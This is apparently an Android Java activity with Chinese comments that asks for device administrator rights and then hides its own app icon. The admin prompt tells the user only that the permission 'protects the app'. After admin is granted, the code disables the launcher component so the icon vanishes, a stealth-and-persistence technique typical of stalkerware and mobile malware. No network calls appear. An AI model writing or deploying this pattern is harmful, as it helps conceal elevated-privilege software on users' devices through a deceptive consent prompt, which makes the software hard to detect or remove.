package com.example.targetadpackage;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_ENABLE_ADMIN = 1;
    private ComponentName adminComponent;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 初始化设备管理组件
        adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        
        if (!dpm.isAdminActive(adminComponent)) {
            // 如果还没有激活设备管理员，请求激活
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "需要权限以保护应用");
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
        } else {
            // 如果已经是设备管理员，直接隐藏图标并退出
            hideAppIcon();
            finish();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
            if (resultCode == RESULT_OK) {
                // 用户同意激活设备管理员
                Toast.makeText(this, "设备管理员已激活", Toast.LENGTH_SHORT).show();
                
                // ===== 这里是隐藏图标的代码位置 =====
                hideAppIcon();
            } else {
                // 用户拒绝激活设备管理员
                Toast.makeText(this, "需要设备管理员权限", Toast.LENGTH_SHORT).show();
            }
        }
        
        // 无论结果如何，都结束Activity
        finish();
    }
    
    /**
     * 隐藏应用图标的方法
     */
    private void hideAppIcon() {
        // 获取PackageManager
        PackageManager pm = getPackageManager();
        
        // 创建MainActivity的ComponentName
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        
        // 禁用MainActivity组件，这会隐藏应用图标
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
        
        Toast.makeText(this, "应用已隐藏", Toast.LENGTH_SHORT).show();
    }
}